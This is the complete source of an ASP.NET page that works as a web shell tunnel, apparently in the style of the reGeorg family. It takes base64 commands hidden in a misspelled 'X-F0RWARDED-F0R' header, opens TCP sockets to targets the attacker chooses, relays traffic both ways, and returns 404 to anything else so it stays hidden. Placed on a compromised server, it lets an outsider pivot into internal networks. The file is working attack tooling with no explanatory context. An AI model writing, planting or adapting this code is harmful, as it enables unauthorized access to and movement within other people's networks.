<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%
    try
    {
        if (Request.HttpMethod == "POST")
        {
            string[] cmd = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request.Headers.Get("X-F0RWARDED-F0R"))).Split(',');
            if (cmd[0] == "check")
            {
               Response.AddHeader("SESSIONID", "VEhBTksgR09EIE5RIA");
            }
            if (cmd[0] == "connect")
            {
                try
                {   
                    String target = cmd[1];
                    int port = int.Parse(cmd[2]);
                    IPAddress ip = IPAddress.Parse(target);
                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                    Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteEP);
                    sender.Blocking = false;
                    Session.Add("socket", sender);
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd[0] == "disconnect")
            {
                try {
                    Socket s = (Socket)Session["socket"];
                    s.Close();
                } catch (Exception ex){

                }
                Session.Abandon();
                Response.AddHeader("X-STATUS", "OK");
            }
            else if (cmd[0] == "forward")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int buffLen = Request.ContentLength;
                    byte[] buff = new byte[buffLen];
                    int c = 0;
                    while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                    {
                        s.Send(buff);
                    }
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd[0] == "read")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int c = 0;
                    byte[] readBuff = new byte[512];
                    try
                    {
                        while ((c = s.Receive(readBuff)) > 0)
                        {
                            byte[] newBuff = new byte[c];
                            System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                            Response.BinaryWrite(newBuff);
                        }
                        Response.AddHeader("X-STATUS", "OK");
                    }                    
                    catch (SocketException soex)
                    {
                        Response.AddHeader("X-STATUS", "OK");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            } 
            else{
                Response.StatusCode = 404;
            }
        } else {
            Response.StatusCode = 404;
        }
    }
    catch (Exception exKak)
    {
        Response.AddHeader("X-ERROR", exKak.Message);
        Response.AddHeader("X-STATUS", "FAIL");
    }
%>
